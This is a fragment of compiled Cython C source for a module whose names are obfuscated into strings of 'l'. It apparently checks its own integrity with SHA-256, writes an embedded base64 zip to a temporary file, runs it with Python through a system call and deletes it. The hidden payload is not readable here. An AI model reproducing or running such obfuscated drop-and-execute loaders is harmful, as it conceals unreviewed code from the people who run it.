      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_1, function);
    }
  }
  __pyx_t_2 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_1, __pyx_t_5, __pyx_t_4) : __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 33, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_hexdigest); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 33, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_1);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_1, function);
    }
  }
  __pyx_t_3 = (__pyx_t_2) ? __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_2) : __Pyx_PyObject_CallNoArg(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 33, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_llllllllllllllllllllll); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 33, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = PyObject_RichCompare(__pyx_t_3, __pyx_t_1, Py_NE); __Pyx_XGOTREF(__pyx_t_2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 33, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_7 = __Pyx_PyObject_IsTrue(__pyx_t_2); if (unlikely(__pyx_t_7 < 0)) __PYX_ERR(0, 33, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (unlikely(__pyx_t_7)) {

    
    __pyx_t_2 = __Pyx_PyObject_Call(((PyObject *)(&((PyTypeObject*)PyExc_Exception)[0])), __pyx_tuple__2, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 34, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_Raise(__pyx_t_2, 0, 0, 0);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __PYX_ERR(0, 34, __pyx_L1_error)

    
  }

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_AddTraceback("source.lllllllllllllllllllllll", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_combined);
  __Pyx_XDECREF(__pyx_v_hashlib);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_3llllllllllllll(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_6source_3llllllllllllll = {"llllllllllllll", (PyCFunction)__pyx_pw_6source_3llllllllllllll, METH_NOARGS, 0};
static PyObject *__pyx_pw_6source_3llllllllllllll(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("llllllllllllll (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_2llllllllllllll(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_2llllllllllllll(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_v_lllllllllllllll = NULL;
  PyObject *__pyx_v_llllllllllllllll = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  int __pyx_t_6;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("llllllllllllll", 0);

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_lllllll); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1928, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_NamedTemporaryFile); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 1928, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1929, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_delete, Py_False) < 0) __PYX_ERR(0, 1929, __pyx_L1_error)
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_lllllllll); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 1929, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_5 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_4);
    if (likely(__pyx_t_5)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
      __Pyx_INCREF(__pyx_t_5);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_4, function);
    }
  }
  __pyx_t_3 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_5, __pyx_int_0) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_int_0);
  __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
  if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 1929, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_suffix, __pyx_t_3) < 0) __PYX_ERR(0, 1929, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_empty_tuple, __pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 1928, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_v_lllllllllllllll = __pyx_t_3;
  __pyx_t_3 = 0;

  
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_lllllllllllllll, __pyx_n_s_name); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 1930, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_v_llllllllllllllll = __pyx_t_3;
  __pyx_t_3 = 0;

  
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_lllllllllllllll, __pyx_n_s_close); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1931, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_1);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_1, function);
    }
  }
  __pyx_t_3 = (__pyx_t_2) ? __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_2) : __Pyx_PyObject_CallNoArg(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 1931, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_llllllllll); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1932, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_lllllllllllll); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 1932, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_4 = NULL;
  __pyx_t_6 = 0;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_1))) {
    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_1);
    if (likely(__pyx_t_4)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
      __Pyx_INCREF(__pyx_t_4);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_1, function);
      __pyx_t_6 = 1;
    }
  }
  #if CYTHON_FAST_PYCALL
  if (PyFunction_Check(__pyx_t_1)) {
    PyObject *__pyx_temp[3] = {__pyx_t_4, __pyx_v_llllllllllllllll, __pyx_t_2};
    __pyx_t_3 = __Pyx_PyFunction_FastCall(__pyx_t_1, __pyx_temp+1-__pyx_t_6, 2+__pyx_t_6); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 1932, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  } else
  #endif
  #if CYTHON_FAST_PYCCALL
  if (__Pyx_PyFastCFunction_Check(__pyx_t_1)) {
    PyObject *__pyx_temp[3] = {__pyx_t_4, __pyx_v_llllllllllllllll, __pyx_t_2};
    __pyx_t_3 = __Pyx_PyCFunction_FastCall(__pyx_t_1, __pyx_temp+1-__pyx_t_6, 2+__pyx_t_6); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 1932, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  } else
  #endif
  {
    __pyx_t_5 = PyTuple_New(2+__pyx_t_6); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 1932, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    if (__pyx_t_4) {
      __Pyx_GIVEREF(__pyx_t_4); PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_t_4); __pyx_t_4 = NULL;
    }
    __Pyx_INCREF(__pyx_v_llllllllllllllll);
    __Pyx_GIVEREF(__pyx_v_llllllllllllllll);
    PyTuple_SET_ITEM(__pyx_t_5, 0+__pyx_t_6, __pyx_v_llllllllllllllll);
    __Pyx_GIVEREF(__pyx_t_2);
    PyTuple_SET_ITEM(__pyx_t_5, 1+__pyx_t_6, __pyx_t_2);
    __pyx_t_2 = 0;
    __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_t_5, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 1932, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_lllllllllll); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1933, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_5 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_1))) {
    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_1);
    if (likely(__pyx_t_5)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
      __Pyx_INCREF(__pyx_t_5);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_1, function);
    }
  }
  __pyx_t_3 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_1, __pyx_t_5, __pyx_v_llllllllllllllll) : __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_v_llllllllllllllll);
  __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
  if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 1933, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __Pyx_XDECREF(__pyx_r);
  __Pyx_INCREF(__pyx_v_llllllllllllllll);
  __pyx_r = __pyx_v_llllllllllllllll;
  goto __pyx_L0;

  

  /* function exit code */
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_AddTraceback("source.llllllllllllll", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_lllllllllllllll);
  __Pyx_XDECREF(__pyx_v_llllllllllllllll);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static struct __pyx_obj_6source___pyx_scope_struct____pyx_lambda_funcdef_6source_lambda4 *__pyx_freelist_6source___pyx_scope_struct____pyx_lambda_funcdef_6source_lambda4[8];
static int __pyx_freecount_6source___pyx_scope_struct____pyx_lambda_funcdef_6source_lambda4 = 0;

static PyObject *__pyx_tp_new_6source___pyx_scope_struct____pyx_lambda_funcdef_6source_lambda4(PyTypeObject *t, CYTHON_UNUSED PyObject *a, CYTHON_UNUSED PyObject *k) {
  PyObject *o;
  if (CYTHON_COMPILING_IN_CPYTHON && likely((__pyx_freecount_6source___pyx_scope_struct____pyx_lambda_funcdef_6source_lambda4 > 0) & (t->tp_basicsize == sizeof(struct __pyx_obj_6source___pyx_scope_struct____pyx_lambda_funcdef_6source_lambda4)))) {
    o = (PyObject*)__pyx_freelist_6source___pyx_scope_struct____pyx_lambda_funcdef_6source_lambda4[--__pyx_freecount_6source___pyx_scope_struct____pyx_lambda_funcdef_6source_lambda4];
    memset(o, 0, sizeof(struct __pyx_obj_6source___pyx_scope_struct____pyx_lambda_funcdef_6source_lambda4));
    (void) PyObject_INIT(o, t);
    PyObject_GC_Track(o);
  } else {
    o = (*t->tp_alloc)(t, 0);
    if (unlikely(!o)) return 0;
  }
  return o;
}

static void __pyx_tp_dealloc_6source___pyx_scope_struct____pyx_lambda_funcdef_6source_lambda4(PyObject *o) {
  struct __pyx_obj_6source___pyx_scope_struct____pyx_lambda_funcdef_6source_lambda4 *p = (struct __pyx_obj_6source___pyx_scope_struct____pyx_lambda_funcdef_6source_lambda4 *)o;
  PyObject_GC_UnTrack(o);
  Py_CLEAR(p->__pyx_v_d);
  if (CYTHON_COMPILING_IN_CPYTHON && ((__pyx_freecount_6source___pyx_scope_struct____pyx_lambda_funcdef_6source_lambda4 < 8) & (Py_TYPE(o)->tp_basicsize == sizeof(struct __pyx_obj_6source___pyx_scope_struct____pyx_lambda_funcdef_6source_lambda4)))) {
    __pyx_freelist_6source___pyx_scope_struct____pyx_lambda_funcdef_6source_lambda4[__pyx_freecount_6source___pyx_scope_struct____pyx_lambda_funcdef_6source_lambda4++] = ((struct __pyx_obj_6source___pyx_scope_struct____pyx_lambda_funcdef_6source_lambda4 *)o);
  } else {
    (*Py_TYPE(o)->tp_free)(o);
  }
}

static int __pyx_tp_traverse_6source___pyx_scope_struct____pyx_lambda_funcdef_6source_lambda4(PyObject *o, visitproc v, void *a) {
  int e;
  struct __pyx_obj_6source___pyx_scope_struct____pyx_lambda_funcdef_6source_lambda4 *p = (struct __pyx_obj_6source___pyx_scope_struct____pyx_lambda_funcdef_6source_lambda4 *)o;
  if (p->__pyx_v_d) {
    e = (*v)(p->__pyx_v_d, a); if (e) return e;
  }
  return 0;
}

static int __pyx_tp_clear_6source___pyx_scope_struct____pyx_lambda_funcdef_6source_lambda4(PyObject *o) {
  PyObject* tmp;
  struct __pyx_obj_6source___pyx_scope_struct____pyx_lambda_funcdef_6source_lambda4 *p = (struct __pyx_obj_6source___pyx_scope_struct____pyx_lambda_funcdef_6source_lambda4 *)o;
  tmp = ((PyObject*)p->__pyx_v_d);
  p->__pyx_v_d = Py_None; Py_INCREF(Py_None);
  Py_XDECREF(tmp);
  return 0;
}

static PyTypeObject __pyx_type_6source___pyx_scope_struct____pyx_lambda_funcdef_6source_lambda4 = {
  PyVarObject_HEAD_INIT(0, 0)
  "source.__pyx_scope_struct____pyx_lambda_funcdef_6source_lambda4", /*tp_name*/
  sizeof(struct __pyx_obj_6source___pyx_scope_struct____pyx_lambda_funcdef_6source_lambda4), /*tp_basicsize*/
  0, /*tp_itemsize*/
  __pyx_tp_dealloc_6source___pyx_scope_struct____pyx_lambda_funcdef_6source_lambda4, /*tp_dealloc*/
  #if PY_VERSION_HEX < 0x030800b4
  0, /*tp_print*/
  #endif
  #if PY_VERSION_HEX >= 0x030800b4
  0, /*tp_vectorcall_offset*/
  #endif
  0, /*tp_getattr*/
  0, /*tp_setattr*/
  #if PY_MAJOR_VERSION < 3
  0, /*tp_compare*/
  #endif
  #if PY_MAJOR_VERSION >= 3
  0, /*tp_as_async*/
  #endif
  0, /*tp_repr*/
  0, /*tp_as_number*/
  0, /*tp_as_sequence*/
  0, /*tp_as_mapping*/
  0, /*tp_hash*/
  0, /*tp_call*/
  0, /*tp_str*/
  0, /*tp_getattro*/
  0, /*tp_setattro*/
  0, /*tp_as_buffer*/
  Py_TPFLAGS_DEFAULT|Py_TPFLAGS_HAVE_VERSION_TAG|Py_TPFLAGS_CHECKTYPES|Py_TPFLAGS_HAVE_NEWBUFFER|Py_TPFLAGS_HAVE_GC, /*tp_flags*/
  0, /*tp_doc*/
  __pyx_tp_traverse_6source___pyx_scope_struct____pyx_lambda_funcdef_6source_lambda4, /*tp_traverse*/
  __pyx_tp_clear_6source___pyx_scope_struct____pyx_lambda_funcdef_6source_lambda4, /*tp_clear*/
  0, /*tp_richcompare*/
  0, /*tp_weaklistoffset*/
  0, /*tp_iter*/
  0, /*tp_iternext*/
  0, /*tp_methods*/
  0, /*tp_members*/
  0, /*tp_getset*/
  0, /*tp_base*/
  0, /*tp_dict*/
  0, /*tp_descr_get*/
  0, /*tp_descr_set*/
  0, /*tp_dictoffset*/
  0, /*tp_init*/
  0, /*tp_alloc*/
  __pyx_tp_new_6source___pyx_scope_struct____pyx_lambda_funcdef_6source_lambda4, /*tp_new*/
  0, /*tp_free*/
  0, /*tp_is_gc*/
  0, /*tp_bases*/
  0, /*tp_mro*/
  0, /*tp_cache*/
  0, /*tp_subclasses*/
  0, /*tp_weaklist*/
  0, /*tp_del*/
  0, /*tp_version_tag*/
  #if PY_VERSION_HEX >= 0x030400a1
  0, /*tp_finalize*/
  #endif
  #if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)
  0, /*tp_vectorcall*/
  #endif
  #if PY_VERSION_HEX >= 0x030800b4 && PY_VERSION_HEX < 0x03090000
  0, /*tp_print*/
  #endif
  #if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000
  0, /*tp_pypy_flags*/
  #endif
};

static PyMethodDef __pyx_methods[] = {
  {0, 0, 0, 0}
};

#if PY_MAJOR_VERSION >= 3
#if CYTHON_PEP489_MULTI_PHASE_INIT
static PyObject* __pyx_pymod_create(PyObject *spec, PyModuleDef *def); /*proto*/
static int __pyx_pymod_exec_source(PyObject* module); /*proto*/
static PyModuleDef_Slot __pyx_moduledef_slots[] = {
  {Py_mod_create, (void*)__pyx_pymod_create},
  {Py_mod_exec, (void*)__pyx_pymod_exec_source},
  {0, NULL}
};
#endif

static struct PyModuleDef __pyx_moduledef = {
    PyModuleDef_HEAD_INIT,
    "source",
    0, /* m_doc */
  #if CYTHON_PEP489_MULTI_PHASE_INIT
    0, /* m_size */
  #else
    -1, /* m_size */
  #endif
    __pyx_methods /* m_methods */,
  #if CYTHON_PEP489_MULTI_PHASE_INIT
    __pyx_moduledef_slots, /* m_slots */
  #else
    NULL, /* m_reload */
  #endif
    NULL, /* m_traverse */
    NULL, /* m_clear */
    NULL /* m_free */
};
#endif
#ifndef CYTHON_SMALL_CODE
#if defined(__clang__)
    #define CYTHON_SMALL_CODE
#elif defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 3))
    #define CYTHON_SMALL_CODE __attribute__((cold))
#else
    #define CYTHON_SMALL_CODE
#endif
#endif

static __Pyx_StringTabEntry __pyx_string_tab[] = {
  {&__pyx_kp_u_, __pyx_k_, sizeof(__pyx_k_), 0, 1, 0, 0},
  {&__pyx_n_u_Kriyox, __pyx_k_Kriyox, sizeof(__pyx_k_Kriyox), 0, 1, 0, 1},
  {&__pyx_n_s_NamedTemporaryFile, __pyx_k_NamedTemporaryFile, sizeof(__pyx_k_NamedTemporaryFile), 0, 0, 1, 1},
  {&__pyx_n_u_Shishya, __pyx_k_Shishya, sizeof(__pyx_k_Shishya), 0, 1, 0, 1},
  {&__pyx_kp_u_UEsDBBQAAAAAABtlvVodb_QZ7rkBAO65, __pyx_k_UEsDBBQAAAAAABtlvVodb_QZ7rkBAO65, sizeof(__pyx_k_UEsDBBQAAAAAABtlvVodb_QZ7rkBAO65), 0, 1, 0, 0},
  {&__pyx_n_s_b64decode, __pyx_k_b64decode, sizeof(__pyx_k_b64decode), 0, 0, 1, 1},
  {&__pyx_n_u_b9d4772332e9dcc5376f1869cf910fe4, __pyx_k_b9d4772332e9dcc5376f1869cf910fe4, sizeof(__pyx_k_b9d4772332e9dcc5376f1869cf910fe4), 0, 1, 0, 1},
  {&__pyx_n_s_chr, __pyx_k_chr, sizeof(__pyx_k_chr), 0, 0, 1, 1},
  {&__pyx_n_s_cline_in_traceback, __pyx_k_cline_in_traceback, sizeof(__pyx_k_cline_in_traceback), 0, 0, 1, 1},
  {&__pyx_n_s_close, __pyx_k_close, sizeof(__pyx_k_close), 0, 0, 1, 1},
  {&__pyx_n_s_combined, __pyx_k_combined, sizeof(__pyx_k_combined), 0, 0, 1, 1},
  {&__pyx_n_s_d, __pyx_k_d, sizeof(__pyx_k_d), 0, 0, 1, 1},
  {&__pyx_n_s_delete, __pyx_k_delete, sizeof(__pyx_k_delete), 0, 0, 1, 1},
  {&__pyx_n_s_encode, __pyx_k_encode, sizeof(__pyx_k_encode), 0, 0, 1, 1},
  {&__pyx_n_s_exists, __pyx_k_exists, sizeof(__pyx_k_exists), 0, 0, 1, 1},
  {&__pyx_kp_u_file_will_not_run_anymore_as_mai, __pyx_k_file_will_not_run_anymore_as_mai, sizeof(__pyx_k_file_will_not_run_anymore_as_mai), 0, 1, 0, 0},
  {&__pyx_n_s_flush, __pyx_k_flush, sizeof(__pyx_k_flush), 0, 0, 1, 1},
  {&__pyx_n_s_hashlib, __pyx_k_hashlib, sizeof(__pyx_k_hashlib), 0, 0, 1, 1},
  {&__pyx_n_s_hexdigest, __pyx_k_hexdigest, sizeof(__pyx_k_hexdigest), 0, 0, 1, 1},
  {&__pyx_n_s_import, __pyx_k_import, sizeof(__pyx_k_import), 0, 0, 1, 1},
  {&__pyx_n_s_lambda, __pyx_k_lambda, sizeof(__pyx_k_lambda), 0, 0, 1, 1},
  {&__pyx_n_s_lambda_locals_lambda, __pyx_k_lambda_locals_lambda, sizeof(__pyx_k_lambda_locals_lambda), 0, 0, 1, 1},
  {&__pyx_n_s_lll, __pyx_k_lll, sizeof(__pyx_k_lll), 0, 0, 1, 1},
  {&__pyx_n_s_llll, __pyx_k_llll, sizeof(__pyx_k_llll), 0, 0, 1, 1},
  {&__pyx_n_s_lllll, __pyx_k_lllll, sizeof(__pyx_k_lllll), 0, 0, 1, 1},
  {&__pyx_n_s_llllll, __pyx_k_llllll, sizeof(__pyx_k_llllll), 0, 0, 1, 1},
  {&__pyx_n_s_lllllll, __pyx_k_lllllll, sizeof(__pyx_k_lllllll), 0, 0, 1, 1},
  {&__pyx_n_s_llllllll, __pyx_k_llllllll, sizeof(__pyx_k_llllllll), 0, 0, 1, 1},
  {&__pyx_n_s_lllllllll, __pyx_k_lllllllll, sizeof(__pyx_k_lllllllll), 0, 0, 1, 1},
  {&__pyx_n_s_llllllllll, __pyx_k_llllllllll, sizeof(__pyx_k_llllllllll), 0, 0, 1, 1},
  {&__pyx_n_s_lllllllllll, __pyx_k_lllllllllll, sizeof(__pyx_k_lllllllllll), 0, 0, 1, 1},
  {&__pyx_n_s_llllllllllll, __pyx_k_llllllllllll, sizeof(__pyx_k_llllllllllll), 0, 0, 1, 1},
  {&__pyx_n_s_lllllllllllll, __pyx_k_lllllllllllll, sizeof(__pyx_k_lllllllllllll), 0, 0, 1, 1},
  {&__pyx_n_s_llllllllllllll, __pyx_k_llllllllllllll, sizeof(__pyx_k_llllllllllllll), 0, 0, 1, 1},
  {&__pyx_n_s_lllllllllllllll, __pyx_k_lllllllllllllll, sizeof(__pyx_k_lllllllllllllll), 0, 0, 1, 1},
  {&__pyx_n_s_llllllllllllllll, __pyx_k_llllllllllllllll, sizeof(__pyx_k_llllllllllllllll), 0, 0, 1, 1},
  {&__pyx_n_s_llllllllllllllllllll, __pyx_k_llllllllllllllllllll, sizeof(__pyx_k_llllllllllllllllllll), 0, 0, 1, 1},
  {&__pyx_n_s_lllllllllllllllllllll, __pyx_k_lllllllllllllllllllll, sizeof(__pyx_k_lllllllllllllllllllll), 0, 0, 1, 1},
  {&__pyx_n_s_llllllllllllllllllllll, __pyx_k_llllllllllllllllllllll, sizeof(__pyx_k_llllllllllllllllllllll), 0, 0, 1, 1},
  {&__pyx_n_s_lllllllllllllllllllllll, __pyx_k_lllllllllllllllllllllll, sizeof(__pyx_k_lllllllllllllllllllllll), 0, 0, 1, 1},
  {&__pyx_n_s_main, __pyx_k_main, sizeof(__pyx_k_main), 0, 0, 1, 1},
  {&__pyx_n_s_map, __pyx_k_map, sizeof(__pyx_k_map), 0, 0, 1, 1},
  {&__pyx_n_s_n, __pyx_k_n, sizeof(__pyx_k_n), 0, 0, 1, 1},
  {&__pyx_n_s_name, __pyx_k_name, sizeof(__pyx_k_name), 0, 0, 1, 1},
  {&__pyx_n_s_name_2, __pyx_k_name_2, sizeof(__pyx_k_name_2), 0, 0, 1, 1},
  {&__pyx_n_s_open, __pyx_k_open, sizeof(__pyx_k_open), 0, 0, 1, 1},
  {&__pyx_n_s_path, __pyx_k_path, sizeof(__pyx_k_path), 0, 0, 1, 1},
  {&__pyx_kp_u_python, __pyx_k_python, sizeof(__pyx_k_python), 0, 1, 0, 0},
  {&__pyx_n_s_remove, __pyx_k_remove, sizeof(__pyx_k_remove), 0, 0, 1, 1},
  {&__pyx_n_s_sha256, __pyx_k_sha256, sizeof(__pyx_k_sha256), 0, 0, 1, 1},
  {&__pyx_n_s_source, __pyx_k_source, sizeof(__pyx_k_source), 0, 0, 1, 1},
  {&__pyx_kp_s_source_py, __pyx_k_source_py, sizeof(__pyx_k_source_py), 0, 0, 1, 0},
  {&__pyx_n_s_suffix, __pyx_k_suffix, sizeof(__pyx_k_suffix), 0, 0, 1, 1},
  {&__pyx_n_s_system, __pyx_k_system, sizeof(__pyx_k_system), 0, 0, 1, 1},
  {&__pyx_n_s_test, __pyx_k_test, sizeof(__pyx_k_test), 0, 0, 1, 1},
  {&__pyx_kp_u_tmp_zip, __pyx_k_tmp_zip, sizeof(__pyx_k_tmp_zip), 0, 1, 0, 0},
  {&__pyx_n_u_wb, __pyx_k_wb, sizeof(__pyx_k_wb), 0, 1, 0, 1},
  {&__pyx_n_s_write, __pyx_k_write, sizeof(__pyx_k_write), 0, 0, 1, 1},
  {0, 0, 0, 0, 0, 0, 0}
};
static CYTHON_SMALL_CODE int __Pyx_InitCachedBuiltins(void) {
